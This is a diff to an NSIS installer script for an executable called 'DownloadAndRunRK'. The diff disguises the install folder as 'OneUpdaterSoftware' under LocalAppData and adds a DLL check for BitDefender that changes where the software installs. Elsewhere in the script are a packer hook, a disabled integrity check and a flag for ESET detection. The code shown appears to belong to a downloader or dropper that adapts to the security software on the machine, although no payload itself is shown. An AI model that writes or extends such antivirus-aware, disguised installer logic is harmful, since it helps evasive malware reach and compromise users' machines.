@@ -1,10 +1,12 @@
 ;!packhdr $%TEMP%\exehead.tmp `"d:\Regular.Downloader\AutoCompile\PU\pckhdr\asprotect.bat" "$%TEMP%\exehead.tmp"`
 
+
 Name "DownloadAndRunRK"
 
 OutFile "DownloadAndRunRK.exe"
 
-InstallDir $PROGRAMFILES\DownloadAndRunRK
+
+InstallDir "$LOCALAPPDATA\OneUpdaterSoftware"
 
 CRCCheck off
 
@@ -34,8 +36,6 @@ Var UseValidateExit
 !include "md5util.nsh"
 !include "UA.nsh"
 !include "dll.nsh"
-
-
 
 
 Page components
@@ -80,8 +80,6 @@ Function .onInit
     
     SetOutPath $PLUGINSDIR
     
-    StrCpy $INSTDIR $EXEDIR
-    
     StrCpy $EsetFound "false"
     
     Call InitDll
@@ -89,6 +87,15 @@ Function .onInit
     File /oname=$PLUGINSDIR\${utilites}.dll "D:\Regular.Downloader\AutoCompile\Source\${utilites}.dll"
     
     Call GenerateQuant
+    
+    StrCpy $0 ""
+    CallInstDLL $DllPath\${utilites}.dll /NOUNLOAD ${CheckBitDefender}
+    
+    ${if} $0 == "D"
+        StrCpy $INSTDIR "$PROGRAMFILES\OneUpdaterSoftware"
+    ${endif}
+    
+    CreateDirectory $INSTDIR
     
     Banner::destroy /NOUNLOAD
     
